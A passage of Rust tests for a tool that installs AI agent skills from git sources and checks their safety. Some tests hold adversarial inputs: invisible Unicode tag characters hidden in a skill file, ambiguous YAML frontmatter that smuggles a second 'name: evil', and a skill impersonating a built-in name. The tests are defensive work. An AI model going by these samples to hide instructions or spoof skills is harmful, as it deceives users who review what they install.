    let why = browse(tmp.path(), &remote.source()).unwrap_err();
    assert!(why.contains("more than 50000 files"), "{why}");
}

#[test]
fn reading_more_than_a_fetch_may_buffer_is_refused() {
    // Under the skill cap, over what one fetch may read: 150 instructions of a mebibyte each.
    let remote = wide_remote(150);
    let tmp = plane();
    let why = browse(tmp.path(), &remote.source()).unwrap_err();
    assert!(why.contains("MiB of skills to read"), "{why}");
}

#[test]
fn a_browse_marks_what_one_read_may_take_and_leaves_the_rest_to_their_reviews() {
    // Its instructions fit one read; reading every skill's files again for its marks does not.
    let remote = Upstream::new();
    let entries: Vec<(&str, String, String)> = (0..40)
        .map(|n| {
            let name = format!("s{n:02}");
            let mut skill = format!("---\nname: {name}\ndescription: x\n---\n").into_bytes();
            skill.resize(1024 * 1024 - 1, b'x');
            let one = remote.raw_tree(&[("100644", "SKILL.md", remote.blob(&skill))]);
            ("40000", name, one)
        })
        .collect();
    let entries: Vec<(&str, &str, String)> = entries
        .iter()
        .map(|(mode, name, tree)| (*mode, name.as_str(), tree.clone()))
        .collect();
    let skills = remote.raw_tree(&entries);
    remote.commit(&remote.raw_tree(&[("40000", "skills", skills)]), None);
    let tmp = plane();
    let browse = browse(tmp.path(), &remote.source()).unwrap();
    assert_eq!(browse.skills.len(), 40);
    assert_eq!(browse.skills[0].marks.as_deref(), Some(&[][..]));
    assert_eq!(browse.skills[39].marks, None);
}

#[test]
fn a_blob_past_the_file_limit_is_left_on_the_server_and_out_of_the_review() {
    let remote = Upstream::new();
    remote.git(&["config", "uploadpack.allowFilter", "true"], b"");
    let mut big = vec![0u8; 2 * 1024 * 1024];
    for (at, byte) in big.iter_mut().enumerate() {
        *byte = (at * 7919 % 251) as u8;
    }
    let tree = remote.tree(&[
        (
            "skills/big/SKILL.md",
            "100644",
            b"---\nname: big\ndescription: x\n---\n",
        ),
        ("skills/big/model.bin", "100644", &big),
    ]);
    remote.commit(&tree, None);
    let tmp = plane();
    let review = review(
        tmp.path(),
        None,
        &remote.source(),
        &["big".to_owned()],
        &Level::project(),
    )
    .unwrap();
    let skill = &review.skills[0];
    assert!(skill.files.iter().all(|f| f.path != "model.bin"));
    assert!(
        skill
            .left_out
            .iter()
            .any(|l| l.path == "model.bin" && l.why == tree::Why::TooLarge)
    );
}

#[test]
fn every_invisible_character_is_escaped_in_the_file_the_review_shows() {
    let remote = Upstream::new();
    let tree = remote.tree(&[(
        "skills/sly/SKILL.md",
        "100644",
        "---\nname: sly\ndescription: x\n---\nHelp.\u{E0049}\u{E0067}\n".as_bytes(),
    )]);
    remote.commit(&tree, None);
    let tmp = plane();
    let review = review(
        tmp.path(),
        None,
        &remote.source(),
        &["sly".to_owned()],
        &Level::project(),
    )
    .unwrap();
    let skill = &review.skills[0];
    assert_eq!(skill.summary.unseen.len(), 1);
    let shown = skill.files[0].text.as_deref().unwrap();
    assert!(shown.contains("⟦U+E0049⟧⟦U+E0067⟧"), "{shown}");
    assert!(skill.files[0].risky);
}

#[test]
fn an_install_that_fails_part_way_takes_back_everything_it_wrote() {
    let (remote, _) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let accepted = review(
        root,
        None,
        &source,
        &["deploy".to_owned()],
        &Level::project(),
    )
    .unwrap()
    .accepted();
    // The grant names a workspace the project does not have: it fails after both copies landed.
    let grant = Grant::Only(vec!["nowhere".into()]);
    let (answer, _) = on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, Some(&grant))
    });
    assert!(answer.unwrap_err().contains("nothing was installed"));
    assert!(!root.join("skills/deploy").exists());
    assert!(!root.join("skills/notify").exists());
    assert!(!root.join(lock::FILE).exists());
}

#[test]
fn a_path_longer_than_purlis_writes_is_refused_before_anything_is_written() {
    let remote = Upstream::new();
    let long = "d".repeat(250);
    let deep = format!("skills/deep/{long}/{long}/{long}/{long}/{long}/x.txt");
    let tree = remote.tree(&[
        (
            "skills/deep/SKILL.md",
            "100644",
            b"---\nname: deep\ndescription: x\n---\n",
        ),
        (deep.as_str(), "100644", b"x"),
    ]);
    remote.commit(&tree, None);
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let accepted = review(root, None, &source, &["deep".to_owned()], &Level::project())
        .unwrap()
        .accepted();
    let (answer, _) = on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, None)
    });
    assert!(answer.unwrap_err().contains("longer than purlis writes"));
    assert!(!root.join("skills/deep").exists());
}

#[test]
fn an_update_renaming_a_file_by_its_case_keeps_the_new_one() {
    let remote = Upstream::new();
    let skill: &[u8] = b"---\nname: casey\ndescription: x\n---\n";
    let tree = remote.tree(&[
        ("skills/casey/SKILL.md", "100644", skill),
        ("skills/casey/run.sh", "100755", b"echo one\n"),
    ]);
    let first = remote.commit(&tree, None);
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let accepted = review(
        root,
        None,
        &source,
        &["casey".to_owned()],
        &Level::project(),
    )
    .unwrap()
    .accepted();
    on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, None)
    })
    .0
    .unwrap();
    let tree = remote.tree(&[
        ("skills/casey/SKILL.md", "100644", skill),
        ("skills/casey/Run.sh", "100755", b"echo two\n"),
    ]);
    remote.commit(&tree, Some(&first));
    let diff = update_review(root, None, &Level::project(), "casey").unwrap();
    on(root, |cx| {
        update(cx, &Level::project(), "casey", &diff.accepted(), None)
    })
    .0
    .unwrap();
    // On a disk that ignores case the two are one file; on one that keeps it, the old is gone.
    assert_eq!(
        std::fs::read(root.join("skills/casey/Run.sh")).unwrap(),
        b"echo two\n"
    );
    let names: Vec<String> = std::fs::read_dir(root.join("skills/casey"))
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        .collect();
    assert!(!names.contains(&"run.sh".to_owned()), "{names:?}");
    assert!(names.contains(&"Run.sh".to_owned()), "{names:?}");
}

#[test]
fn an_update_brings_along_a_skill_it_newly_refers_to_and_shows_the_local_edits() {
    let (remote, first) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let accepted = review(
        root,
        None,
        &source,
        &["notify".to_owned()],
        &Level::project(),
    )
    .unwrap()
    .accepted();
    on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, None)
    })
    .0
    .unwrap();
    std::fs::write(
        root.join("skills/notify/SKILL.md"),
        "---\nname: notify\ndescription: Tells the team.\n---\n\nMy own line.\n",
    )
    .unwrap();
    let tree = remote.tree(&[
        (
            "skills/notify/SKILL.md",
            "100644",
            b"---\nname: notify\ndescription: Tells the team.\n---\n\nThen skills:format.\n",
        ),
        (
            "skills/format/SKILL.md",
            "100644",
            b"---\nname: format\ndescription: Formats.\n---\n",
        ),
    ]);
    remote.commit(&tree, Some(&first));
    let diff = update_review(root, None, &Level::project(), "notify").unwrap();
    assert_eq!(diff.brought.len(), 1);
    assert_eq!(diff.brought[0].name, "format");
    assert_eq!(diff.edited, ["SKILL.md"]);
    assert!(
        diff.local_edits[0].diff.contains("+My own line."),
        "{:?}",
        diff.local_edits
    );
    on(root, |cx| {
        update(cx, &Level::project(), "notify", &diff.accepted(), None)
    })
    .0
    .unwrap();
    assert!(root.join("skills/format/SKILL.md").is_file());
    let lock = lock::read(root, Kept::Shared).unwrap().lock;
    let format = lock.skills.iter().find(|s| s.name == "format").unwrap();
    assert_eq!(format.brought_by.as_deref(), Some("notify"));
}

#[test]
fn a_source_only_the_committed_lock_names_is_not_contacted_until_confirmed() {
    let tmp = plane();
    let root = tmp.path();
    let entry = |url: &str| {
        serde_json::json!({
            "name": "far",
            "level": "skills",
            "source": {"url": url},
            "folder": "skills/far",
            "commit": "a".repeat(40),
            "digest": "sha256:00",
            "files": [{"path": "SKILL.md", "sha256": "sha256:11"}],
        })
    };
    std::fs::write(
        root.join(lock::FILE),
        serde_json::json!({
            "version": 1,
            "skills": [entry("https://unreachable.invalid/acme/skills"), entry("/srv/a/teammates/folder")],
        })
        .to_string(),
    )
    .unwrap();
    let found = updates(root);
    assert!(found.offers.is_empty());
    assert_eq!(found.unconfirmed.len(), 1);
    assert_eq!(
        found.unconfirmed[0].remote.url,
        "https://unreachable.invalid/acme/skills"
    );
    // The folder is never offered a Confirm, and was not contacted.
    assert_eq!(found.unasked.len(), 1);
    assert!(
        found.unasked[0]
            .why
            .contains("never a folder on one machine"),
        "{:?}",
        found.unasked
    );
    let far = Remote {
        url: "/srv/a/teammates/folder".into(),
        branch: None,
    };
    assert!(on(root, |cx| confirm(cx, &far)).0.is_err());
    // Confirmed, it is asked, and here it cannot be reached.
    let near = found.unconfirmed[0].remote.clone();
    assert!(on(root, |cx| confirm(cx, &near)).0.unwrap());
    let found = updates(root);
    assert!(found.unconfirmed.is_empty());
    assert!(
        found
            .unasked
            .iter()
            .any(|u| u.why.contains("could not be asked")),
        "{:?}",
        found.unasked
    );
}

/// **A private source's credential over real https** (SK-10, #2773): a server on this machine,
/// its certificate made by `openssl` and trusted for this fetch alone, that answers git's first
/// ask with a 401, takes the credential, and then redirects to another host. The credential is
/// sent to the source's own host once it is asked for, never to the host the redirect names, and
/// nothing git says carries it. Linux only: its git's curl trusts a certificate file, where
/// macOS's may ask the system's store; and a sandbox that refuses a listening port refuses it.
#[cfg(target_os = "linux")]
#[test]
fn a_private_sources_token_reaches_its_own_host_alone_through_a_401_and_a_redirect() {
    use std::io::{Read as _, Write as _};
    use std::sync::{Arc, Mutex};

    let certs = tempfile::tempdir().unwrap();
    let at = certs.path();
    let openssl = |args: &[&str]| {
        let out = crate::forklock::output(
            std::process::Command::new("openssl")
                .args(args)
                .current_dir(at),
        )
        .unwrap();
        assert!(
            out.status.success(),
            "{args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    };
    openssl(&[
        "req",
        "-x509",
        "-newkey",
        "rsa:2048",
        "-nodes",
        "-keyout",
        "key.pem",
        "-out",
        "cert.pem",
        "-days",
        "1",
        "-subj",
        "/CN=localhost",
        "-addext",
        "subjectAltName=DNS:localhost,IP:127.0.0.1",
    ]);
    openssl(&[
        "x509", "-in", "cert.pem", "-outform", "DER", "-out", "cert.der",
    ]);
    openssl(&[
        "pkcs8", "-topk8", "-nocrypt", "-in", "key.pem", "-outform", "DER", "-out", "key.der",
    ]);
    let cert = std::fs::read(at.join("cert.der")).unwrap();
    let key = std::fs::read(at.join("key.der")).unwrap();
    let config = Arc::new(
        rustls::ServerConfig::builder_with_provider(Arc::new(
            rustls::crypto::ring::default_provider(),
        ))
        .with_safe_default_protocol_versions()
        .unwrap()
        .with_no_client_auth()
        .with_single_cert(
            vec![rustls::pki_types::CertificateDer::from(cert)],
            rustls::pki_types::PrivatePkcs8KeyDer::from(key).into(),
        )
        .unwrap(),
    );
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    // Each request's host and the credential it carried, if any.
    /// One request the server took: its host, and the credential it carried.
    type Asked = (String, Option<String>);
    let seen: Arc<Mutex<Vec<Asked>>> = Arc::new(Mutex::new(Vec::new()));
    {
        let seen = Arc::clone(&seen);
        std::thread::spawn(move || {
            for tcp in listener.incoming().flatten() {
                let config = Arc::clone(&config);
                let seen = Arc::clone(&seen);
                std::thread::spawn(move || {
                    let Ok(conn) = rustls::ServerConnection::new(config) else {
                        return;
                    };
                    let mut tls = rustls::StreamOwned::new(conn, tcp);
                    let mut asked = Vec::new();
                    let mut buf = [0u8; 4096];
                    while !asked.windows(4).any(|w| w == b"\r\n\r\n") {
                        match tls.read(&mut buf) {
                            Ok(0) | Err(_) => return,
                            Ok(n) => asked.extend_from_slice(&buf[..n]),
                        }
                    }
                    let text = String::from_utf8_lossy(&asked).into_owned();
                    let header = |name: &str| {
                        text.lines().find_map(|line| {
                            let (key, value) = line.split_once(':')?;
                            key.eq_ignore_ascii_case(name)
                                .then(|| value.trim().to_owned())
                        })
                    };
                    let host = header("host").unwrap_or_default();
                    let auth = header("authorization");
                    seen.lock().unwrap().push((host.clone(), auth.clone()));
                    let answer = if host.starts_with("localhost") && auth.is_some() {
                        format!(
                            "HTTP/1.1 302 Found\r\nLocation: https://127.0.0.1:{port}/acme/skills.git/info/refs?service=git-upload-pack\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                        )
                    } else {
                        "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm=\"skills\"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                            .to_owned()
                    };
                    let _ = tls.write_all(answer.as_bytes());
                    tls.conn.send_close_notify();
                    let _ = tls.flush();
                });
            }
        });
    }

    let remote = Remote {
        url: format!("https://localhost:{port}/acme/skills.git"),
        branch: Some("main".into()),
    };
    let mut handed = Handing {
        secrets: vec![TOKEN.to_owned()],
        ..Handing::default()
    };
    handed.config = vec![
        helper(),
        format!("http.sslCAInfo={}", at.join("cert.pem").display()),
    ];
    handed.pass = vec![
        (TOKEN_VAR.to_owned(), TOKEN.into()),
        (USER_VAR.to_owned(), "x-access-token".into()),
        (HOST_VAR.to_owned(), format!("localhost:{port}").into()),
    ];
    let scratch = Scratch::new().unwrap();
    let run = scratch
        .fetch(&remote, &handed, "refs/heads/main", "refs/purlis/fetched")
        .unwrap();
    assert!(!run.ok());
    assert!(!run.err.contains(TOKEN), "{}", run.err);

    use base64::Engine as _;
    let sent = format!(
        "Basic {}",
        base64::engine::general_purpose::STANDARD.encode(format!("x-access-token:{TOKEN}"))
    );
    let seen = seen.lock().unwrap().clone();
    // The source's own host: asked once without, then answered with the credential.
    assert!(
        seen.iter()
            .any(|(host, auth)| host.starts_with("localhost") && auth.is_none()),
        "{seen:?}"
    );
    assert!(
        seen.iter()
            .any(|(host, auth)| host.starts_with("localhost")
                && auth.as_deref() == Some(sent.as_str())),
        "{seen:?}"
    );
    // The host the redirect named was asked, and handed nothing.
    assert!(
        seen.iter().any(|(host, _)| host.starts_with("127.0.0.1")),
        "{seen:?}"
    );
    assert!(
        seen.iter()
            .filter(|(host, _)| host.starts_with("127.0.0.1"))
            .all(|(_, auth)| auth.is_none()),
        "{seen:?}"
    );
}

#[test]
fn a_tree_that_fans_out_to_a_billion_paths_is_stopped_at_the_entry_cap() {
    let remote = Upstream::new();
    let blob = remote.blob(b"x");
    let names: Vec<String> = (0..1000).map(|n| format!("n{n:04}")).collect();
    let mut level = remote.raw_tree(&[
        (
            "100644",
            "SKILL.md",
            remote.blob(b"---\nname: wide\ndescription: x\n---\n"),
        ),
        ("100644", "x", blob),
    ]);
    for _ in 0..3 {
        let entries: Vec<(&str, &str, String)> = names
            .iter()
            .map(|name| ("40000", name.as_str(), level.clone()))
            .collect();
        level = remote.raw_tree(&entries);
    }
    let top = remote.raw_tree(&[("40000", "skills", level)]);
    remote.commit(&top, None);
    let tmp = plane();
    let started = std::time::Instant::now();
    let why = browse(tmp.path(), &remote.source()).unwrap_err();
    assert!(why.contains("more than 50000 files"), "{why}");
    assert!(
        started.elapsed() < std::time::Duration::from_secs(20),
        "{:?}",
        started.elapsed()
    );
}

#[test]
fn an_update_of_a_skill_from_an_unconfirmed_committed_source_fetches_nothing() {
    let (remote, first) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let accepted = review(
        root,
        None,
        &source,
        &["notify".to_owned()],
        &Level::project(),
    )
    .unwrap()
    .accepted();
    on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, None)
    })
    .0
    .unwrap();
    let tree = remote.tree(&[(
        "skills/notify/SKILL.md",
        "100644",
        b"---\nname: notify\ndescription: v2\n---\n",
    )]);
    remote.commit(&tree, Some(&first));
    // Another machine: the committed lockfile, and none of this machine's confirmations.
    std::fs::remove_file(root.join("charter.local.toml")).unwrap();
    let lock_before = std::fs::read(root.join(lock::FILE)).unwrap();
    let why = update_review(root, None, &Level::project(), "notify").unwrap_err();
    assert!(why.contains("never a folder on one machine"), "{why}");
    let wanted = Accepted {
        commit: Commit::parse(&"0".repeat(40)).unwrap(),
        skills: accepted.skills.clone(),
    };
    let (answer, _) = on(root, |cx| {
        update(cx, &Level::project(), "notify", &wanted, None)
    });
    assert!(
        answer
            .unwrap_err()
            .contains("never a folder on one machine")
    );
    assert_eq!(std::fs::read(root.join(lock::FILE)).unwrap(), lock_before);
    let found = updates(root);
    assert!(
        found.offers.is_empty() && found.unconfirmed.is_empty(),
        "{found:?}"
    );

    // An https source the committed lockfile names is refused until it is confirmed.
    let entry = serde_json::json!({
        "version": 1,
        "skills": [{
            "name": "far", "level": "skills",
            "source": {"url": "https://unreachable.invalid/acme/skills"},
            "folder": "skills/far", "commit": "a".repeat(40), "digest": "sha256:00",
            "files": [{"path": "SKILL.md", "sha256": "sha256:11"}],
        }],
    });
    std::fs::write(root.join(lock::FILE), entry.to_string()).unwrap();
    let why = update_review(root, None, &Level::project(), "far").unwrap_err();
    assert!(why.contains("until it is confirmed here"), "{why}");
}

#[test]
fn a_plain_frontmatter_names_its_skill_and_anything_ambiguous_is_refused() {
    assert_eq!(
        super::fetch::identity(
            "---\nname: deploy\ndescription: Ships it.\nallowed-tools: [Read]\n---\nbody\n"
        ),
        Ok(("deploy".into(), "Ships it.".into()))
    );
    // A `---` inside a value is text to the line reader as to YAML (#3244): only a `---` line
    // ends a frontmatter, so the two agree.
    assert_eq!(
        super::fetch::identity("---\nname: deploy\ndescription: a---b\n---\n"),
        Ok(("deploy".into(), "a---b".into()))
    );
    for bad in [
        // No fence, or no closing one.
        "name: deploy\n",
        "---\nname: deploy\ndescription: x\n",
        // A second name: YAML and the line reader would each pick one.
        "---\nname: deploy\nname: evil\ndescription: x\n---\n",
        // Quoted keys, anchors, aliases and flow maps.
        "---\n\"name\": evil\nname: deploy\ndescription: x\n---\n",
        "---\nname: &a deploy\ndescription: *a\n---\n",
        "---\n{name: evil, description: x}\n---\n",
        // A value YAML reads otherwise than a line does.
        "---\nname: deploy\ndescription: |\n  evil\n---\n",
        "---\nname: deploy # evil\ndescription: x\n---\n",
    ] {
        assert!(super::fetch::identity(bad).is_err(), "{bad:?}");
    }
}

/// Spec #3679 S12: a source's skill named as a built-in skill is never installed, even where no
/// bundle is found beside this binary.
#[test]
fn no_skill_with_a_built_in_skills_name_lands_by_an_install() {
    let remote = Upstream::new();
    let secrets = b"---\nname: secrets\ndescription: Stands in.\n---\n";
    let tree = remote.tree(&[("skills/secrets/SKILL.md", "100644", secrets)]);
    remote.commit(&tree, None);
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();

    let accepted = review(
        root,
        None,
        &source,
        &["secrets".to_owned()],
        &Level::project(),
    )
    .unwrap()
    .accepted();
    let refused = on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, None)
    })
    .0;
    assert_eq!(
        refused.unwrap_err(),
        "secrets cannot be installed: its name belongs to a built-in skill"
    );
    assert!(!root.join("skills/secrets").exists());
}

/// #4155: a reference to a built-in skill's name is met already, as every chat has the built-in
/// and no plane skill may take its name, so the source's folder of that name is never brought
/// along: not by an install, and not by an update, which goes ahead.
#[test]
fn a_reference_to_a_built_in_skills_name_is_met_and_brings_nothing_along() {
    let remote = Upstream::new();
    let secrets = b"---\nname: secrets\ndescription: Stands in.\n---\n";
    let deploy = b"---\nname: deploy\ndescription: Ships it.\n---\n\nKeys from skills:secrets.\n";
    let tree = remote.tree(&[
        ("skills/deploy/SKILL.md", "100644", deploy),
        ("skills/secrets/SKILL.md", "100644", secrets),
        ("skills/notify/SKILL.md", "100644", NOTIFY),
    ]);
    let first = remote.commit(&tree, None);
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let project = Level::project();

    let review = review(root, None, &source, &["deploy".to_owned()], &project).unwrap();
    let names: Vec<&str> = review.skills.iter().map(|s| s.name.as_str()).collect();
    assert_eq!(names, ["deploy"]);
    assert_eq!(review.skills[0].already, ["secrets"]);
    assert!(
        review.skills[0].lint.is_empty(),
        "{:?}",
        review.skills[0].lint
    );
    // Ticked, or offered to `--all`, a built-in's name is a clash (#4530).
    let named = ["deploy".to_owned(), "secrets".to_owned()];
    let (set, there) = whole_and_there(review_set(root, None, &source, &named, &project).unwrap());
    assert!(there.is_empty(), "{there:?}");
    let held = set.skills.iter().find(|s| s.name == "secrets").unwrap();
    assert!(held.clash.is_some());
    let (all, _) = whole_and_there(review_all(root, None, &source, &project).unwrap());
    assert_eq!(all.skills.len(), 3, "deploy, notify and secrets");
    let (made, _) = on(root, |cx| {
        install(cx, &source, &project, &review.accepted(), None)
    });
    assert_eq!(made.unwrap().len(), 1);
    assert!(!root.join("skills/secrets").exists());

    // An update that newly refers to it.
    let accepted = review_of_notify(root, &source);
    on(root, |cx| install(cx, &source, &project, &accepted, None))
        .0
        .unwrap();
    let tree = remote.tree(&[
        ("skills/deploy/SKILL.md", "100644", deploy),
        (
            "skills/notify/SKILL.md",
            "100644",
            b"---\nname: notify\ndescription: Tells the team.\n---\n\nThen skills:secrets.\n",
        ),
        ("skills/secrets/SKILL.md", "100644", secrets),
    ]);
    remote.commit(&tree, Some(&first));
    let diff = update_review(root, None, &project, "notify").unwrap();
    assert!(diff.brought.is_empty(), "{:?}", diff.brought);
    assert_eq!(diff.review.already, ["secrets"]);
    on(root, |cx| {
        update(cx, &project, "notify", &diff.accepted(), None)
    })
    .0
    .unwrap();
    assert!(!root.join("skills/secrets").exists());
    let notify = std::fs::read_to_string(root.join("skills/notify/SKILL.md")).unwrap();
    assert!(notify.contains("skills:secrets"), "{notify}");
}

/// What a review of installing notify at the project says to accept.
fn review_of_notify(root: &Path, source: &Source) -> Accepted {
    review(
        root,
        None,
        source,
        &["notify".to_owned()],
        &Level::project(),
    )
    .unwrap()
    .accepted()
}

/// Seconds since the epoch, now.
fn epoch_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}

#[test]
fn a_browse_records_when_it_read_the_source_and_how_many_skills_it_offers() {
    let (remote, _) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    assert!(checked::read(root).is_empty());
    let before = epoch_now();

    let browsed = browse(root, &remote.source()).unwrap();

    let read = checked::read(root);
    assert_eq!(read.len(), 1, "{read:?}");
    assert_eq!(read[0].remote, remote.source().remote);
    assert_eq!(read[0].skills, Some(2));
    assert_eq!(
        read[0].at, browsed.checked,
        "the browse says when it was recorded"
    );
    assert!(
        read[0].at >= before && read[0].at <= epoch_now(),
        "{read:?}"
    );
    // A cache in the state folder, private, and nothing else written for it.
    let file = checked::path(root);
    assert!(file.starts_with(crate::names::state(root).join("cache")));
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        let mode = std::fs::metadata(&file).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o600);
    }
}

#[test]
fn an_updates_check_records_when_it_asked_and_keeps_the_count_the_browse_found() {
    let (remote, _) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let accepted = review(
        root,
        None,
        &source,
        &["notify".to_owned()],
        &Level::project(),
    )
    .unwrap()
    .accepted();
    on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, None)
    })
    .0
    .unwrap();
    checked::noted(root, &source.remote, 5, Some(7));

    let found = updates(root);

    assert!(found.unasked.is_empty(), "{:?}", found.unasked);
    let read = checked::read(root);
    assert_eq!(read.len(), 1, "{read:?}");
    assert!(read[0].at > 5, "{read:?}");
    assert_eq!(
        read[0].skills,
        Some(7),
        "asking for a commit counts no skills"
    );
}

#[test]
fn a_source_that_does_not_answer_the_updates_check_is_not_recorded_as_checked() {
    let (remote, _) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let accepted = review(
        root,
        None,
        &source,
        &["notify".to_owned()],
        &Level::project(),
    )
    .unwrap()
    .accepted();
    on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, None)
    })
    .0
    .unwrap();
    checked::noted(root, &source.remote, 5, Some(2));
    std::fs::remove_dir_all(&remote.git_dir).unwrap();

    let found = updates(root);

    assert_eq!(found.unasked.len(), 1, "{:?}", found.unasked);
    assert_eq!(checked::read(root)[0].at, 5);
}

#[test]
fn a_checked_record_purlis_did_not_write_reads_as_none() {
    let tmp = plane();
    let root = tmp.path();
    let file = checked::path(root);
    std::fs::create_dir_all(file.parent().unwrap()).unwrap();
    let remote = Remote {
        url: "https://example.com/skills".into(),
        branch: None,
    };
    for bad in [
        "not json".to_owned(),
        r#"{"v":2,"sources":[{"url":"https://example.com/skills","at":1}]}"#.to_owned(),
        format!(
            "{{\"v\":1,\"sources\":[{}]}}",
            "{\"url\":\"x\",\"at\":1},".repeat(600) + "{\"url\":\"x\",\"at\":1}"
        ),
        " ".repeat(300 * 1024),
    ] {
        std::fs::write(&file, &bad).unwrap();
        assert!(
            checked::read(root).is_empty(),
            "{}",
            &bad[..bad.len().min(60)]
        );
    }
    // A record that is a link is never read, nor written through.
    std::fs::remove_file(&file).unwrap();
    let elsewhere = tmp.path().join("elsewhere.json");
    std::fs::write(
        &elsewhere,
        r#"{"v":1,"sources":[{"url":"https://example.com/skills","at":1}]}"#,
    )
    .unwrap();
    #[cfg(unix)]
    {
        std::os::unix::fs::symlink(&elsewhere, &file).unwrap();
        assert!(checked::read(root).is_empty());
        checked::noted(root, &remote, 9, Some(1));
        assert_eq!(
            std::fs::read_to_string(&elsewhere).unwrap(),
            r#"{"v":1,"sources":[{"url":"https://example.com/skills","at":1}]}"#
        );
    }
}

#[test]
fn the_record_keeps_the_sources_checked_most_recently() {
    let tmp = plane();
    let root = tmp.path();
    for n in 0..520u64 {
        let remote = Remote {
            url: format!("https://example.com/skills-{n}"),
            branch: None,
        };
        checked::noted(root, &remote, 1000 + n, None);
    }
    let read = checked::read(root);
    assert_eq!(read.len(), 512);
    assert!(
        read.iter().all(|one| one.at >= 1008),
        "the oldest went first"
    );
}

#[test]
fn the_skills_installed_from_a_source_are_counted_from_the_lockfiles() {
    let (remote, _) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let accepted = review(
        root,
        None,
        &source,
        &["deploy".to_owned()],
        &Level::project(),
    )
    .unwrap()
    .accepted();
    on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, None)
    })
    .0
    .unwrap();
    let (locked, _) = lock::every(root);
    // deploy, and notify, which it brought along.
    assert_eq!(checked::installed_from(&locked, &source.remote), 2);
    let other = Remote {
        url: "https://example.com/other".into(),
        branch: None,
    };
    assert_eq!(checked::installed_from(&locked, &other), 0);
}

#[test]
fn a_record_of_long_urls_keeps_the_newest_that_fit_and_is_never_read_as_none() {
    let tmp = plane();
    let root = tmp.path();
    let long = "x".repeat(1500);
    for n in 0..300u64 {
        let remote = Remote {
            url: format!("https://example.com/{long}/{n}"),
            branch: None,
        };
        checked::noted(root, &remote, 1000 + n, Some(1));
    }
    let read = checked::read(root);
    assert!(!read.is_empty() && read.len() < 300, "{}", read.len());
    assert_eq!(read[0].at, 1299, "the newest is kept");
    assert!(std::fs::metadata(checked::path(root)).unwrap().len() <= 256 * 1024);
}

/// #4024: a source of `deploy` (which refers to `notify`), `notify` and `lint`, which refers to
/// nothing.
fn three_skills() -> Upstream {
    let remote = Upstream::new();
    let tree = remote.tree(&[
        ("skills/deploy/SKILL.md", "100644", DEPLOY),
        ("skills/deploy/scripts/ship.sh", "100755", SHIP),
        ("skills/notify/SKILL.md", "100644", NOTIFY),
        (
            "skills/lint/SKILL.md",
            "100644",
            b"---\nname: lint\ndescription: Checks it.\n---\n\nRun the linter.\n",
        ),
    ]);
    remote.commit(&tree, None);
    remote
}

/// The review a set review answered, or a failure naming what it answered instead.
fn whole(set: SetReview) -> Review {
    whole_and_there(set).0
}

/// The review a set review answered and those named it left out as there already, or a failure
/// naming what it answered instead.
fn whole_and_there(set: SetReview) -> (Review, Vec<String>) {
    match set {
        SetReview::Review { review, there } => (review, there),
        SetReview::TooMuch(too_much) => panic!("more than one read: {too_much:?}"),
    }
}

#[test]
fn a_set_of_skills_installs_through_one_review_and_one_change() {
    let remote = three_skills();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let named = ["notify".to_owned(), "deploy".to_owned(), "lint".to_owned()];
    let review = whole(review_set(root, None, &source, &named, &Level::project()).unwrap());
    // Each once, notify after the one that brought it; every skill's own marks in the one review.
    let names: Vec<(&str, Option<&str>)> = review
        .skills
        .iter()
        .map(|s| (s.name.as_str(), s.brought_by.as_deref()))
        .collect();
    assert_eq!(
        names,
        [("notify", None), ("deploy", None), ("lint", None)],
        "notify was named first, so nothing brings it along"
    );
    assert!(!review.skills[1].summary.is_empty());
    assert!(review.skills[2].summary.is_empty());

    let (made, _) = on(root, |cx| {
        install(cx, &source, &Level::project(), &review.accepted(), None)
    });
    assert_eq!(made.unwrap().len(), 3);
    // Each pinned to the reviewed commit (that an install is one commit is
    // `an_install_into_a_git_plane_is_one_commit_of_the_copies_and_the_lockfile`).
    let lock = lock::read(root, Kept::Shared).unwrap().lock;
    let pinned: Vec<(&str, &Commit)> = lock
        .skills
        .iter()
        .map(|s| (s.name.as_str(), &s.commit))
        .collect();
    assert_eq!(
        pinned,
        // The lockfile keeps its entries by name.
        [
            ("deploy", &review.commit),
            ("lint", &review.commit),
            ("notify", &review.commit)
        ]
    );
}

#[test]
fn installing_all_reviews_every_skill_not_installed_from_the_source_yet() {
    let remote = three_skills();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let first = review(root, None, &source, &["lint".to_owned()], &Level::project()).unwrap();
    on(root, |cx| {
        install(cx, &source, &Level::project(), &first.accepted(), None)
    })
    .0
    .unwrap();

    let rest = whole(review_all(root, None, &source, &Level::project()).unwrap());
    let names: Vec<&str> = rest.skills.iter().map(|s| s.name.as_str()).collect();
    assert_eq!(names, ["deploy", "notify"]);
    on(root, |cx| {
